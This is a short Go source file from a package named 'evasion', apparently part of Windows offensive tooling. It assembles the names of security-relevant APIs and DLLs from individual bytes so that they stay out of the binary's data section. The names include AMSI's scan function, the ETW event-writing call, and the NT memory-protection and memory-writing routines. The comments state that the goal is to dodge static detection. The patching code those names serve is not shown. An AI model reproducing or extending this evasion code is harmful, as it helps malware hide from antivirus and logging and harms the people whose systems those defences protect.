//go:build windows
// +build windows

package evasion

// stackStr assembles a string from individual byte literals so the string
// never appears as a contiguous sequence in the binary's data section.
// garble -literals handles this automatically at compile time; this is a
// defence-in-depth fallback for non-garble builds.
func stackStr(b ...byte) string { return string(b) }

// Sensitive API/DLL names built from bytes — no string literal in .rodata.
func sAmsiDLL() string {
	return stackStr('a', 'm', 's', 'i', '.', 'd', 'l', 'l')
}
func sAmsiScanBuffer() string {
	return stackStr('A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r')
}
func sEtwEventWrite() string {
	return stackStr('E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e')
}
func sNtdll() string {
	return stackStr('n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l')
}
func sKernel32() string {
	return stackStr('k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l')
}
func sVirtualProtect() string {
	return stackStr('V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't')
}
func sNtProtectVirtualMemory() string {
	return stackStr('N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y')
}
func sNtWriteVirtualMemory() string {
	return stackStr('N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y')
}
func sNtFlushInstructionCache() string {
	return stackStr('N', 't', 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e')
}
